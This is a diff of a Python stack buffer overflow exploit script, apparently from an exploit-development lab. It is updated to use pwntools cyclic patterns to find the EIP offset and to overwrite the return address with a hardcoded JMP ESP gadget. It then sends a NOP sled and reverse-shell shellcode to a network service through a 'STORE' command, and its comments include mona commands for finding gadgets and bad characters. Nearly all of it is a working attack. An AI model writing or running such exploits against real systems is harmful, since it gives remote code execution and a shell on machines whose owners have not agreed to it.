@@ -1,60 +1,80 @@
 import socket
 import struct
-
+import pwn
 
 def main():
 	RHOST = "192.168.0.136"
-	RPORT = 31337
+	RPORT = 8080
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 	s.connect((RHOST, RPORT))
-	
+
+######### KEY VARS ################
+
 	# Get bad chars
-	bc_ch = get_bdch()
+	bd_ch = get_bdch()
 	# Get shellcode
 	shellcode = get_shellcode()
-	# build exploit
-	buf_tot_len = 1024
-	#MONA PATTERN
-	#!mona pattern_create 1024
-	#!mona pattern_offset 39654138
-	offset_srp = 146
-	# gadget JMP ESP @
-	# 080416BF, 080414C3
-	#ptr_jmp_esp = 0x080416bf
-	ptr_jmp_esp = 0x080414c3
+	# Bytes needed to crash system
+	buf_tot_len = 3500
+	# Cyclic pattern creation
+	cyc = pwn.cyclic_metasploit(buf_tot_len)
+	# Value in EIP after sending cyclic
+	eip_after_crash = (0x31704330)
+	# Calcualted offset
+	offset_srp = pwn.cyclic_metasploit_find(eip_after_crash)
+	print "Offset is: "+str(offset_srp)
+	# GADGET addres
+	ptr_jmp_esp = 0x759EFCDB
+
+
+#####################################
 	buf = ""
+	# PHASE 0 CRASH
+	#buf += "A"*buf_tot_len
+
+	# PHASE 1, FIND OFFSET
+	#buf += cyc
+
+	# PHASE 2, FIND BAD CHRS
 	buf += "A"*(offset_srp - len(buf))
+	#buf += "BBBB"
+	#buf += bd_ch
+	# PHASE 3, FIND GADGET
+	# !mona jmp -r esp -cpb "\x00\x0a\x0d"  --> 080416BF, 080414C3  (little endian)
+	# !mona jmp -r esp 
+	# !mona findwild -m kernel32.dll -s "jmp esp" -cpb "\x00\x0a\x0d"
+	# gadget JMP ESP @
+	# E.G: 080416BF, 080414C3, 758E3132, 75943165
 	buf += struct.pack("<I",ptr_jmp_esp)
+
+	# PHASE 3.5, TEST WITH INTERUPT
 	# INT 3 (soft breakpoint)
 	#buf += "\xCC\xCC\xCC\xCC"
+
+	# PHASE 4, EXPLOIT
 	# NOP SLED
-	#buf += "\x90"*12
+	buf += "\x90"*12
 	# sub ESP
-	buf += "\x83\xec\x10"
+	#buf += "\x83\xec\x10"
 	buf += shellcode
-	#buf += "BBBB"
-	#buf += bdch_test
+
 	buf += "D"*(buf_tot_len - len(buf))
 	buf += "\n"
-	#buf += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4"
-	s.send(buf)
-	print "Sent: {0}".format(buf)
+	s.send("STORE "+buf)
 	data = s.recv(1024)
-	print "Recieved:  {0}".format(data)
 
 
 
 def get_bdch():
 	########### BAD CHARS ##############
-	#bdch_test = ""
-	bdch = [0x00, 0x0A]
-
+	bdch = []
+	bdch_test = ""
 	# gen string
 	for i in range(0x00, 0xFF+1):
 		if i not in bdch:
 			bdch_test +=chr(i)
-
+	return bdch_test
 	# write file
 	#with open("bdch.bin", "wb") as f:
 	#	f.write(bdch_test)
@@ -127,5 +147,6 @@ def get_shellcode():
 	#return shellcode_calc
 	return shellcode_rev_nc
 	########## END SHELLCODE #############
+
 	
 main()
